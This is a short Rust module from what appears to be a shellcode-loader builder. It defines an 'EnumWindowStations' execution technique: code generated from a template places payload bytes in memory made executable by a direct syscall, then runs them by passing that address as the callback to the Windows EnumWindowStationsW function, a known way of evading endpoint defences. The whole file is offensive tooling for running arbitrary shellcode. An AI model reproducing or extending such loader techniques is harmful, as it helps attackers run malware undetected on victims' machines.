use crate::techniques::{BuildContext, Technique, TechniqueMeta};

pub struct EnumWindowStations;

impl Technique for EnumWindowStations {
    fn meta(&self) -> &'static TechniqueMeta { &ENUM_WINDOW_STATIONS_META }

    fn apply(&self, ctx: &mut BuildContext) -> anyhow::Result<()> {
        ctx.set_template("callbackExec");
        let body = r#"
        let addr = syscall_alloc_exec(&vec);
        if addr.is_null() { return; }
        windows_sys::Win32::System::StationsAndDesktops::EnumWindowStationsW(
            Some(std::mem::transmute(addr)),
            0,
        );
"#;
        ctx.set_replacement("{{CALLBACK_INVOKE}}", body.to_string());
        Ok(())
    }
}

pub use super::super::ENUM_WINDOW_STATIONS_META;
